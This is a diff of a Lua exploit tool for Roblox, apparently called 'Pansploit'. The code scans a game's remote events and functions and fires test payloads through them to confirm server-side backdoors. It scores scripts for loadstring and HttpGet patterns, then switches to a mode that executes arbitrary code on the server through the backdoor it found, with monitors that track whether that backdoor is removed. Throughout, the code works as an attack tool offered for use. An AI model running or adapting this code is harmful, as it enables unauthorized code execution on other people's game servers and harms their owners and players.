@@ -7,12 +7,10 @@ _p._pid = 0
 _p._gid = 0
 _p._testing = false
 
--- LALOL alphabet
 local _alphabet = {}
 for i = 65, 90 do table.insert(_alphabet, string.char(i)) end
 for i = 97, 122 do table.insert(_alphabet, string.char(i)) end
 
--- Storage
 if not _G._pans_data then
     _G._pans_data = {
         bd = nil,
@@ -26,10 +24,10 @@ if not _G._pans_data then
 end
 local _st = _G._pans_data
 
--- Disconnect helper
+-- === HELPER FUNCTIONS (define first) ===
+
 local function _disconnect(reason)
     if not _p._a then return end
-    
     _p._a = false
     _st.injected = false
     _p._m = "CLIENT"
@@ -38,11 +36,9 @@ local function _disconnect(reason)
     _p._infected = nil
     _st.bd = nil
     _st.infected = nil
-    
     print("PANS_DISCONNECT:" .. reason)
     print("PANS_MODE:CLIENT")
     
-    -- Show disconnect toast
     spawn(function()
         wait(0.3)
         local plr = game:GetService("Players").LocalPlayer
@@ -51,21 +47,17 @@ local function _disconnect(reason)
                 for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
                     if g.Name:find("PanToast") then g:Destroy() end
                 end
-                
                 local sg = Instance.new("ScreenGui")
                 sg.Name = "PanDC_" .. tostring(math.random(1000,9999))
                 sg.ResetOnSpawn = false
                 sg.Parent = game:GetService("CoreGui") or plr:WaitForChild("PlayerGui")
-                
                 local fr = Instance.new("Frame")
                 fr.Size = UDim2.new(0, 320, 0, 90)
                 fr.Position = UDim2.new(0.5, -160, 0.5, -45)
                 fr.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
                 fr.BorderSizePixel = 0
                 fr.Parent = sg
-                
                 Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
-                
                 local tl = Instance.new("TextLabel")
                 tl.Size = UDim2.new(1, -20, 0, 30)
                 tl.Position = UDim2.new(0, 10, 0, 10)
@@ -75,7 +67,6 @@ local function _disconnect(reason)
                 tl.Font = Enum.Font.GothamBold
                 tl.TextSize = 18
                 tl.Parent = fr
-                
                 local tr = Instance.new("TextLabel")
                 tr.Size = UDim2.new(1, -20, 0, 40)
                 tr.Position = UDim2.new(0, 10, 0, 40)
@@ -86,7 +77,6 @@ local function _disconnect(reason)
                 tr.TextSize = 12
                 tr.TextWrapped = true
                 tr.Parent = fr
-                
                 wait(5)
                 sg:Destroy()
             end)
@@ -94,33 +84,27 @@ local function _disconnect(reason)
     end)
 end
 
--- Toast notification
 local function _toast(title, text, dur)
     dur = dur or 4
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return end
-    
     pcall(function()
         for _, g in ipairs(game:GetService("CoreGui"):GetChildren()) do
             if g.Name:find("PanToast") then g:Destroy() end
         end
     end)
-    
     local sg = Instance.new("ScreenGui")
     sg.Name = "PanToast_" .. tostring(math.random(1000,9999))
     sg.ResetOnSpawn = false
     pcall(function() sg.Parent = game:GetService("CoreGui") end)
     if not sg.Parent then sg.Parent = plr:WaitForChild("PlayerGui") end
-    
     local fr = Instance.new("Frame")
     fr.Size = UDim2.new(0, 350, 0, 100)
     fr.Position = UDim2.new(1, 20, 1, -120)
     fr.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     fr.BorderSizePixel = 0
     fr.Parent = sg
-    
     Instance.new("UICorner", fr).CornerRadius = UDim.new(0, 10)
-    
     local tl = Instance.new("TextLabel")
     tl.Size = UDim2.new(1, -20, 0, 25)
     tl.Position = UDim2.new(0, 15, 0, 8)
@@ -131,7 +115,6 @@ local function _toast(title, text, dur)
     tl.TextSize = 16
     tl.TextXAlignment = Enum.TextXAlignment.Left
     tl.Parent = fr
-    
     local tx = Instance.new("TextLabel")
     tx.Size = UDim2.new(1, -20, 0, 60)
     tx.Position = UDim2.new(0, 15, 0, 35)
@@ -143,7 +126,6 @@ local function _toast(title, text, dur)
     tx.TextWrapped = true
     tx.TextXAlignment = Enum.TextXAlignment.Left
     tx.Parent = fr
-    
     spawn(function()
         for i = 1, 12 do
             fr.Position = UDim2.new(1, 20 - (i * 29), 1, -120)
@@ -159,7 +141,6 @@ local function _toast(title, text, dur)
     end)
 end
 
--- Generate random name (LALOL)
 local function _generateName(length)
     length = length or math.random(12, 30)
     local name = ""
@@ -169,7 +150,6 @@ local function _generateName(length)
     return name
 end
 
--- Fire test (LALOL)
 local function _fireTest(remote, code)
     local testCode = "a=Instance.new('Model',workspace)a.Name='" .. code .. "'"
     if remote:IsA("RemoteEvent") then
@@ -183,7 +163,6 @@ local function _fireTest(remote, code)
     end
 end
 
--- Execute
 local function _exec(code, useInfected)
     if not code then return false, "No code" end
     if useInfected and _p._infected and _p._infected.Object then
@@ -202,7 +181,317 @@ local function _exec(code, useInfected)
     return s, r
 end
 
--- R6
+-- === DETECTION FUNCTIONS (define before SetMode) ===
+
+local function _analyzeScript(obj)
+    local info = {
+        Object = obj,
+        Path = obj:GetFullName(),
+        Name = obj.Name,
+        Type = obj.ClassName,
+        Score = 0,
+        Reasons = {},
+        InfectionType = "NONE",
+        Tested = false
+    }
+    local src = ""
+    pcall(function() src = obj.Source or "" end)
+    if src == "" then return info end
+    local srcLower = src:lower()
+    
+    if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
+        if src:find("function%s*%([^,]+,[^%)]+%)") then
+            info.Score = info.Score + 100
+            info.InfectionType = "REMOTE_LOADSTRING"
+            table.insert(info.Reasons, "OnServerEvent+loadstring")
+        end
+    end
+    if src:find("OnServerInvoke") and src:find("loadstring") then
+        info.Score = info.Score + 90
+        info.InfectionType = "REMOTEFUNC_LOADSTRING"
+        table.insert(info.Reasons, "OnServerInvoke+loadstring")
+    end
+    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") and src:find("ReplicatedStorage") then
+        info.Score = info.Score + 40
+        table.insert(info.Reasons, "Dynamic RemoteEvent")
+    end
+    if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
+        info.Score = info.Score + 80
+        info.InfectionType = "REQUIRE_INJECTION"
+        table.insert(info.Reasons, "require+HTTP/loadstring")
+    end
+    if src:find("game:HttpGet") and src:find("loadstring") then
+        info.Score = info.Score + 85
+        info.InfectionType = "HTTP_LOADSTRING"
+        table.insert(info.Reasons, "game:HttpGet+loadstring")
+    end
+    if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
+        info.Score = info.Score + 70
+        table.insert(info.Reasons, "Environment manipulation")
+    end
+    if src:find("FireServer") and src:find("loadstring") then
+        info.Score = info.Score + 75
+        table.insert(info.Reasons, "FireServer+loadstring")
+    end
+    local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
+    for _, bad in ipairs(badNames) do
+        if srcLower:find(bad) then
+            info.Score = info.Score + 30
+            table.insert(info.Reasons, "Suspicious: " .. bad)
+        end
+    end
+    local nonPrintable = 0
+    for i = 1, #src do
+        local b = src:byte(i)
+        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
+            nonPrintable = nonPrintable + 1
+        end
+    end
+    if nonPrintable > 50 or #src > 15000 then
+        info.Score = info.Score + 25
+        table.insert(info.Reasons, "Obfuscated")
+    end
+    return info
+end
+
+local function _detectBackdoors()
+    local candidates = {}
+    local testedCodes = {}
+    local services = {
+        game:GetService("ReplicatedStorage"),
+        game:GetService("ReplicatedFirst"),
+        game:GetService("StarterGui"),
+        game:GetService("StarterPack"),
+        game:GetService("StarterPlayer"),
+        game:GetService("Workspace"),
+        game:GetService("Players")
+    }
+    for _, svc in ipairs(services) do
+        for _, obj in ipairs(svc:GetDescendants()) do
+            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                local fullName = obj:GetFullName()
+                if fullName:find("RobloxReplicatedStorage") then continue end
+                if obj.Name:find("DefaultChatSystem") then continue end
+                if obj:FindFirstChild("__FUNCTION") then continue end
+                if _st.testedRemotes[fullName] then continue end
+                table.insert(candidates, obj)
+            end
+        end
+    end
+    local priorityRemotes = {}
+    for _, remote in ipairs(candidates) do
+        local parent = remote.Parent
+        local isPriority = false
+        if parent then
+            for _, s in ipairs(parent:GetDescendants()) do
+                if s:IsA("Script") or s:IsA("LocalScript") then
+                    local analysis = _analyzeScript(s)
+                    if analysis.Score >= 50 then
+                        isPriority = true
+                        break
+                    end
+                end
+            end
+        end
+        local n = remote.Name:lower()
+        if n:find("backdoor") or n:find("admin") or n:find("remote") then
+            isPriority = true
+        end
+        if isPriority then
+            table.insert(priorityRemotes, remote)
+        end
+    end
+    local testResults = {}
+    local workspace = game:GetService("Workspace")
+    for _, remote in ipairs(priorityRemotes) do
+        if _p._testing then break end
+        local code = _generateName(math.random(15, 25))
+        testedCodes[code] = remote
+        _st.testedRemotes[remote:GetFullName()] = true
+        _fireTest(remote, code)
+        wait(0.05)
+    end
+    wait(0.5)
+    for code, remote in pairs(testedCodes) do
+        if workspace:FindFirstChild(code) then
+            table.insert(testResults, {
+                Object = remote,
+                Path = remote:GetFullName(),
+                Name = remote.Name,
+                Type = remote.ClassName,
+                Score = 100,
+                Reasons = {"LALOL_execution_test"},
+                InfectionType = "CONFIRMED_BACKDOOR",
+                Tested = true,
+                ExecutionTime = tick()
+            })
+            pcall(function() workspace[code]:Destroy() end)
+        end
+    end
+    if #testResults == 0 then
+        for _, svc in ipairs(services) do
+            for _, obj in ipairs(svc:GetDescendants()) do
+                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
+                    local analysis = _analyzeScript(obj)
+                    if analysis.Score >= 60 then
+                        table.insert(testResults, analysis)
+                    end
+                end
+                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+                    local hasAttr = false
+                    pcall(function()
+                        if obj:GetAttribute("Backdoor") or obj:GetAttribute("Infected") then
+                            hasAttr = true
+                        end
+                    end)
+                    if hasAttr then
+                        table.insert(testResults, {
+                            Object = obj,
+                            Path = obj:GetFullName(),
+                            Name = obj.Name,
+                            Type = obj.ClassName,
+                            Score = 95,
+                            Reasons = {"marked_attribute"},
+                            InfectionType = "MARKED_BACKDOOR",
+                            Tested = false
+                        })
+                    end
+                end
+            end
+        end
+    end
+    table.sort(testResults, function(a, b) return a.Score > b.Score end)
+    return testResults
+end
+
+-- === MONITORING FUNCTIONS ===
+
+local function _setupBackdoorMonitor()
+    local best = _p._bd or _p._infected
+    if not best then return end
+    spawn(function()
+        while _p._a and best.Object and best.Object.Parent do
+            wait(1)
+        end
+        if _p._a then
+            print("PANS_BACKDOOR_REMOVED")
+            _disconnect("BACKDOOR_REMOVED")
+        end
+    end)
+end
+
+local function _setupTPHandler()
+    local Players = game:GetService("Players")
+    local plr = Players.LocalPlayer
+    if not plr then 
+        print("PANS_ERROR:NoLocalPlayer")
+        return 
+    end
+    local originalObject = _p._bd and _p._bd.Object or (_p._infected and _p._infected.Object)
+    if not originalObject then
+        print("PANS_ERROR:NoBackdoorObject")
+        return
+    end
+    local originalPath = originalObject:GetFullName()
+    local originalName = originalObject.Name
+    print("PANS_MONITOR_START:" .. originalPath)
+    plr.CharacterRemoving:Connect(function()
+        print("PANS_MAINUSER:CharacterRemoving")
+        _disconnect("MAINUSER_CHAR_REMOVED")
+    end)
+    plr.Destroying:Connect(function()
+        print("PANS_MAINUSER:PlayerDestroyed")
+        _disconnect("MAINUSER_DESTROYED")
+    end)
+    plr:GetPropertyChangedSignal("Parent"):Connect(function()
+        if plr.Parent == nil then
+            print("PANS_MAINUSER:ParentNil")
+            _disconnect("MAINUSER_PARENT_NIL")
+        end
+    end)
+    spawn(function()
+        while _p._a do
+            wait(0.5)
+            local exists = pcall(function()
+                return originalObject.Parent
+            end)
+            if not exists then
+                print("PANS_BACKDOOR:ObjectDestroyed")
+                _disconnect("BACKDOOR_DESTROYED")
+                break
+            end
+            local currentPath = ""
+            pcall(function()
+                currentPath = originalObject:GetFullName()
+            end)
+            if currentPath ~= originalPath then
+                print("PANS_BACKDOOR:PathChanged:" .. currentPath)
+                _disconnect("BACKDOOR_MOVED")
+                break
+            end
+            if originalObject.Name ~= originalName then
+                print("PANS_BACKDOOR:Renamed:" .. originalObject.Name)
+                _disconnect("BACKDOOR_RENAMED")
+                break
+            end
+        end
+    end)
+    spawn(function()
+        while _p._a and originalObject do
+            local conn1, conn2
+            pcall(function()
+                conn1 = originalObject:GetPropertyChangedSignal("Parent"):Connect(function()
+                    if not _p._a then return end
+                    if originalObject.Parent == nil then
+                        print("PANS_BACKDOOR:ParentNil")
+                        _disconnect("BACKDOOR_PARENT_NIL")
+                    else
+                        print("PANS_BACKDOOR:ParentChanged")
+                        _disconnect("BACKDOOR_REPARENTED")
+                    end
+                end)
+            end)
+            pcall(function()
+                conn2 = originalObject:GetPropertyChangedSignal("Name"):Connect(function()
+                    if _p._a and originalObject.Name ~= originalName then
+                        print("PANS_BACKDOOR:NameChanged:" .. originalObject.Name)
+                        _disconnect("BACKDOOR_RENAMED_BY_OTHER")
+                    end
+                end)
+            end)
+            while _p._a do wait(0.1) end
+            pcall(function() conn1:Disconnect() end)
+            pcall(function() conn2:Disconnect() end)
+            break
+        end
+    end)
+    local lastGameId = game.GameId
+    spawn(function()
+        while _p._a do
+            wait(2)
+            if game.GameId ~= lastGameId then
+                print("PANS_GAME:GameIdChanged")
+                _disconnect("GAME_CHANGED")
+                break
+            end
+        end
+    end)
+    local lastPlaceId = game.PlaceId
+    spawn(function()
+        while _p._a do
+            wait(2)
+            if game.PlaceId ~= lastPlaceId then
+                print("PANS_GAME:PlaceIdChanged")
+                _disconnect("PLACE_CHANGED")
+                break
+            end
+        end
+    end)
+    print("PANS_MONITOR_ACTIVE")
+end
+
+-- === PUBLIC API FUNCTIONS ===
+
 function _p.R6()
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return false end
@@ -230,7 +519,6 @@ function _p.R6()
     return true
 end
 
--- Respawn
 function _p.Respawn()
     local plr = game:GetService("Players").LocalPlayer
     if not plr then return false end
@@ -246,46 +534,32 @@ function _p.Respawn()
     return true
 end
 
--- FIXED MODE FUNCTIONS WITH RESCAN
-
 function _p.SwitchMode()
     local newMode = _p._m == "BACKDOOR" and "CLIENT" or "BACKDOOR"
     return _p.SetMode(newMode)
 end
 
 function _p.SetMode(mode)
-    -- If switching to BACKDOOR from CLIENT, rescan first
     if mode == "BACKDOOR" and (_p._m == "CLIENT" or not _p._a) then
         print("PANS_RESCAN_START")
-        
-        -- Clear old backdoor data
         _p._bd = nil
         _p._infected = nil
         _st.bd = nil
         _st.infected = nil
         _p._a = false
-        
-        -- Rescan for backdoors
         local backdoors = _detectBackdoors()
-        
         if #backdoors > 0 then
-            -- Found backdoor - register it
             local best = backdoors[1]
             _p._bd = best
             _st.bd = best
-            
             if best.InfectionType == "CONFIRMED_BACKDOOR" then
                 _p._m = "BACKDOOR"
                 _st.mode = "BACKDOOR"
                 _p._a = true
                 _st.injected = true
-                
                 _toast("[Pansploit] BACKDOOR FOUND", 
                     "Switched to: " .. best.Name .. "\nType: " .. best.Type, 4)
-                
                 print("PANS_RESCAN_SUCCESS:CONFIRMED:" .. best.Path)
-                
-                -- Setup monitoring
                 _setupBackdoorMonitor()
                 _setupTPHandler()
             else
@@ -295,37 +569,28 @@ function _p.SetMode(mode)
                 _st.mode = "BACKDOOR"
                 _p._a = true
                 _st.injected = true
-                
                 _toast("[Pansploit] INFECTED FOUND", 
                     "Switched to: " .. best.Name .. "\nScore: " .. best.Score, 4)
-                
                 print("PANS_RESCAN_SUCCESS:INFECTED:" .. best.Path)
-                
                 _setupBackdoorMonitor()
                 _setupTPHandler()
             end
-            
             print("PANS_MODE_SET:BACKDOOR:true")
             return "BACKDOOR"
         else
-            -- No backdoors found - stay in CLIENT mode
             _p._m = "CLIENT"
             _st.mode = "CLIENT"
             _p._a = false
             _st.injected = false
-            
             _toast("[Pansploit] NO BACKDOOR", 
                 "Rescan found nothing\nStaying in CLIENT mode", 3)
-            
             print("PANS_RESCAN_FAILED:NO_BACKDOOR")
             print("PANS_MODE_SET:CLIENT:false")
             return "CLIENT"
         end
     else
-        -- Normal mode switch
         _p._m = mode
         _st.mode = mode
-        
         if mode == "CLIENT" then
             _p._a = false
             _st.injected = false
@@ -333,7 +598,6 @@ function _p.SetMode(mode)
         else
             print("PANS_MODE_SET:" .. mode .. ":" .. tostring(_p._a))
         end
-        
         return _p._m
     end
 end
@@ -342,396 +606,24 @@ function _p.GetMode()
     return _p._m
 end
 
--- Backdoor monitor setup
-local function _setupBackdoorMonitor()
-    local best = _p._bd or _p._infected
-    if not best then return end
-    
-    spawn(function()
-        while _p._a and best.Object and best.Object.Parent do
-            wait(1)
-        end
-        if _p._a then
-            print("PANS_BACKDOOR_REMOVED")
-            _disconnect("BACKDOOR_REMOVED")
-        end
-    end)
-end
-
--- TP Handler
-local function _setupTPHandler()
-    local Players = game:GetService("Players")
-    local plr = Players.LocalPlayer
-    
-    if not plr then 
-        print("PANS_ERROR:NoLocalPlayer")
-        return 
-    end
-    
-    local originalObject = _p._bd and _p._bd.Object or (_p._infected and _p._infected.Object)
-    if not originalObject then
-        print("PANS_ERROR:NoBackdoorObject")
-        return
-    end
-    
-    local originalPath = originalObject:GetFullName()
-    local originalName = originalObject.Name
-    
-    print("PANS_MONITOR_START:" .. originalPath)
-    
-    -- Main user monitoring
-    plr.CharacterRemoving:Connect(function()
-        print("PANS_MAINUSER:CharacterRemoving")
-        _disconnect("MAINUSER_CHAR_REMOVED")
-    end)
-    
-    plr.Destroying:Connect(function()
-        print("PANS_MAINUSER:PlayerDestroyed")
-        _disconnect("MAINUSER_DESTROYED")
-    end)
-    
-    plr:GetPropertyChangedSignal("Parent"):Connect(function()
-        if plr.Parent == nil then
-            print("PANS_MAINUSER:ParentNil")
-            _disconnect("MAINUSER_PARENT_NIL")
-        end
-    end)
-    
-    -- Backdoor monitoring
-    spawn(function()
-        while _p._a do
-            wait(0.5)
-            
-            local exists = pcall(function()
-                return originalObject.Parent
-            end)
-            
-            if not exists then
-                print("PANS_BACKDOOR:ObjectDestroyed")
-                _disconnect("BACKDOOR_DESTROYED")
-                break
-            end
-            
-            local currentPath = ""
-            pcall(function()
-                currentPath = originalObject:GetFullName()
-            end)
-            
-            if currentPath ~= originalPath then
-                print("PANS_BACKDOOR:PathChanged:" .. currentPath)
-                _disconnect("BACKDOOR_MOVED")
-                break
-            end
-            
-            if originalObject.Name ~= originalName then
-                print("PANS_BACKDOOR:Renamed:" .. originalObject.Name)
-                _disconnect("BACKDOOR_RENAMED")
-                break
-            end
-        end
-    end)
-    
-    -- Direct property monitoring
-    spawn(function()
-        while _p._a and originalObject do
-            local conn1, conn2
-            
-            pcall(function()
-                conn1 = originalObject:GetPropertyChangedSignal("Parent"):Connect(function()
-                    if not _p._a then return end
-                    if originalObject.Parent == nil then
-                        print("PANS_BACKDOOR:ParentNil")
-                        _disconnect("BACKDOOR_PARENT_NIL")
-                    else
-                        print("PANS_BACKDOOR:ParentChanged")
-                        _disconnect("BACKDOOR_REPARENTED")
-                    end
-                end)
-            end)
-            
-            pcall(function()
-                conn2 = originalObject:GetPropertyChangedSignal("Name"):Connect(function()
-                    if _p._a and originalObject.Name ~= originalName then
-                        print("PANS_BACKDOOR:NameChanged:" .. originalObject.Name)
-                        _disconnect("BACKDOOR_RENAMED_BY_OTHER")
-                    end
-                end)
-            end)
-            
-            while _p._a do wait(0.1) end
-            
-            pcall(function() conn1:Disconnect() end)
-            pcall(function() conn2:Disconnect() end)
-            break
-        end
-    end)
-    
-    -- Game monitoring
-    local lastGameId = game.GameId
-    spawn(function()
-        while _p._a do
-            wait(2)
-            if game.GameId ~= lastGameId then
-                print("PANS_GAME:GameIdChanged")
-                _disconnect("GAME_CHANGED")
-                break
-            end
-        end
-    end)
-    
-    local lastPlaceId = game.PlaceId
-    spawn(function()
-        while _p._a do
-            wait(2)
-            if game.PlaceId ~= lastPlaceId then
-                print("PANS_GAME:PlaceIdChanged")
-                _disconnect("PLACE_CHANGED")
-                break
-            end
-        end
-    end)
-    
-    print("PANS_MONITOR_ACTIVE")
-end
-
--- Analyze script
-local function _analyzeScript(obj)
-    local info = {
-        Object = obj,
-        Path = obj:GetFullName(),
-        Name = obj.Name,
-        Type = obj.ClassName,
-        Score = 0,
-        Reasons = {},
-        InfectionType = "NONE",
-        Tested = false
-    }
-    
-    local src = ""
-    pcall(function() src = obj.Source or "" end)
-    if src == "" then return info end
-    
-    local srcLower = src:lower()
-    
-    if src:find("OnServerEvent") and src:find("Connect") and src:find("loadstring") then
-        if src:find("function%s*%([^,]+,[^%)]+%)") then
-            info.Score = info.Score + 100
-            info.InfectionType = "REMOTE_LOADSTRING"
-            table.insert(info.Reasons, "OnServerEvent+loadstring")
-        end
-    end
-    
-    if src:find("OnServerInvoke") and src:find("loadstring") then
-        info.Score = info.Score + 90
-        info.InfectionType = "REMOTEFUNC_LOADSTRING"
-        table.insert(info.Reasons, "OnServerInvoke+loadstring")
-    end
-    
-    if src:find("Instance%.new%s*%(%s*[\"']RemoteEvent[\"']") and src:find("ReplicatedStorage") then
-        info.Score = info.Score + 40
-        table.insert(info.Reasons, "Dynamic RemoteEvent")
-    end
-    
-    if src:find("require%s*%(") and (src:find("HttpGet") or src:find("loadstring")) then
-        info.Score = info.Score + 80
-        info.InfectionType = "REQUIRE_INJECTION"
-        table.insert(info.Reasons, "require+HTTP/loadstring")
-    end
-    
-    if src:find("game:HttpGet") and src:find("loadstring") then
-        info.Score = info.Score + 85
-        info.InfectionType = "HTTP_LOADSTRING"
-        table.insert(info.Reasons, "game:HttpGet+loadstring")
-    end
-    
-    if (src:find("setfenv") or src:find("getfenv")) and src:find("loadstring") then
-        info.Score = info.Score + 70
-        table.insert(info.Reasons, "Environment manipulation")
-    end
-    
-    if src:find("FireServer") and src:find("loadstring") then
-        info.Score = info.Score + 75
-        table.insert(info.Reasons, "FireServer+loadstring")
-    end
-    
-    local badNames = {"backdoor", "infect", "virus", "payload", "exploit", "hack", "inject"}
-    for _, bad in ipairs(badNames) do
-        if srcLower:find(bad) then
-            info.Score = info.Score + 30
-            table.insert(info.Reasons, "Suspicious: " .. bad)
-        end
-    end
-    
-    local nonPrintable = 0
-    for i = 1, #src do
-        local b = src:byte(i)
-        if b < 32 and b ~= 9 and b ~= 10 and b ~= 13 then
-            nonPrintable = nonPrintable + 1
-        end
-    end
-    if nonPrintable > 50 or #src > 15000 then
-        info.Score = info.Score + 25
-        table.insert(info.Reasons, "Obfuscated")
-    end
-    
-    return info
-end
-
--- Detect backdoors (LALOL + Payload merged)
-local function _detectBackdoors()
-    local candidates = {}
-    local testedCodes = {}
-    
-    local services = {
-        game:GetService("ReplicatedStorage"),
-        game:GetService("ReplicatedFirst"),
-        game:GetService("StarterGui"),
-        game:GetService("StarterPack"),
-        game:GetService("StarterPlayer"),
-        game:GetService("Workspace"),
-        game:GetService("Players")
-    }
-    
-    for _, svc in ipairs(services) do
-        for _, obj in ipairs(svc:GetDescendants()) do
-            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                local fullName = obj:GetFullName()
-                if fullName:find("RobloxReplicatedStorage") then continue end
-                if obj.Name:find("DefaultChatSystem") then continue end
-                if obj:FindFirstChild("__FUNCTION") then continue end
-                if _st.testedRemotes[fullName] then continue end
-                
-                table.insert(candidates, obj)
-            end
-        end
-    end
-    
-    local priorityRemotes = {}
-    local otherRemotes = {}
-    
-    for _, remote in ipairs(candidates) do
-        local parent = remote.Parent
-        local isPriority = false
-        
-        if parent then
-            for _, s in ipairs(parent:GetDescendants()) do
-                if s:IsA("Script") or s:IsA("LocalScript") then
-                    local analysis = _analyzeScript(s)
-                    if analysis.Score >= 50 then
-                        isPriority = true
-                        break
-                    end
-                end
-            end
-        end
-        
-        local n = remote.Name:lower()
-        if n:find("backdoor") or n:find("admin") or n:find("remote") then
-            isPriority = true
-        end
-        
-        if isPriority then
-            table.insert(priorityRemotes, remote)
-        else
-            table.insert(otherRemotes, remote)
-        end
-    end
-    
-    local testResults = {}
-    local workspace = game:GetService("Workspace")
-    
-    for _, remote in ipairs(priorityRemotes) do
-        if _p._testing then break end
-        local code = _generateName(math.random(15, 25))
-        testedCodes[code] = remote
-        _st.testedRemotes[remote:GetFullName()] = true
-        _fireTest(remote, code)
-        wait(0.05)
-    end
-    
-    wait(0.5)
-    
-    for code, remote in pairs(testedCodes) do
-        if workspace:FindFirstChild(code) then
-            table.insert(testResults, {
-                Object = remote,
-                Path = remote:GetFullName(),
-                Name = remote.Name,
-                Type = remote.ClassName,
-                Score = 100,
-                Reasons = {"LALOL_execution_test"},
-                InfectionType = "CONFIRMED_BACKDOOR",
-                Tested = true,
-                ExecutionTime = tick()
-            })
-            pcall(function() workspace[code]:Destroy() end)
-        end
-    end
-    
-    if #testResults == 0 then
-        for _, svc in ipairs(services) do
-            for _, obj in ipairs(svc:GetDescendants()) do
-                if obj:IsA("Script") or obj:IsA("LocalScript") or obj:IsA("ModuleScript") then
-                    local analysis = _analyzeScript(obj)
-                    if analysis.Score >= 60 then
-                        table.insert(testResults, analysis)
-                    end
-                end
-                
-                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
-                    local hasAttr = false
-                    pcall(function()
-                        if obj:GetAttribute("Backdoor") or obj:GetAttribute("Infected") then
-                            hasAttr = true
-                        end
-                    end)
-                    
-                    if hasAttr then
-                        table.insert(testResults, {
-                            Object = obj,
-                            Path = obj:GetFullName(),
-                            Name = obj.Name,
-                            Type = obj.ClassName,
-                            Score = 95,
-                            Reasons = {"marked_attribute"},
-                            InfectionType = "MARKED_BACKDOOR",
-                            Tested = false
-                        })
-                    end
-                end
-            end
-        end
-    end
-    
-    table.sort(testResults, function(a, b) return a.Score > b.Score end)
-    return testResults
-end
-
--- Init
 function _p.Init(pid, gid)
     _p._pid = pid or 0
     _p._gid = gid or 0
     _st.pid = _p._pid
     _st.gid = _p._gid
-    
     print("PANS_SCAN_START:" .. pid .. ":" .. gid)
-    
     local backdoors = _detectBackdoors()
-    
     if #backdoors > 0 then
         local best = backdoors[1]
         _p._bd = best
         _st.bd = best
-        
         if best.InfectionType == "CONFIRMED_BACKDOOR" then
             _p._m = "BACKDOOR"
             _st.mode = "BACKDOOR"
             _p._a = true
             _st.injected = true
-            
             _toast("[Pansploit] LALOL CONFIRMED!", 
                 "Backdoor: " .. best.Name .. "\nType: " .. best.Type .. "\nMethod: Execution Test", 6)
-            
             print("PANS_BACKDOOR_CONFIRMED:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type)
         else
             _p._infected = best
@@ -740,30 +632,21 @@ function _p.Init(pid, gid)
             _st.mode = "BACKDOOR"
             _p._a = true
             _st.injected = true
-            
             _toast("[Pansploit] INFECTED SCRIPT", 
                 "Path: " .. best.Name .. "\nScore: " .. best.Score .. "/100\nType: " .. best.InfectionType, 5)
-            
             print("PANS_INFECTED_FOUND:" .. pid .. ":" .. gid .. ":" .. best.Path .. ":" .. best.Type .. ":" .. best.InfectionType)
         end
-        
         print("PANS_MODE:BACKDOOR")
-        
-        -- Setup monitoring
         _setupBackdoorMonitor()
         _setupTPHandler()
-        
         return true, best
     end
-    
     _toast("[Pansploit]", "No backdoors found\nRunning in CLIENT mode", 3)
     print("PANS_NO_BACKDOOR:" .. pid .. ":" .. gid)
     print("PANS_MODE:CLIENT")
-    
     return false, nil
 end
 
--- Execute functions
 function _p.Exec(code, useBackdoor)
     if not _p._a and _p._m ~= "CLIENT" then
         return false, "Not active"
@@ -798,7 +681,6 @@ function _p.ExecInfected(code)
     return _exec(code, true)
 end
 
--- Status
 function _p.Status()
     return {
         Active = _p._a,
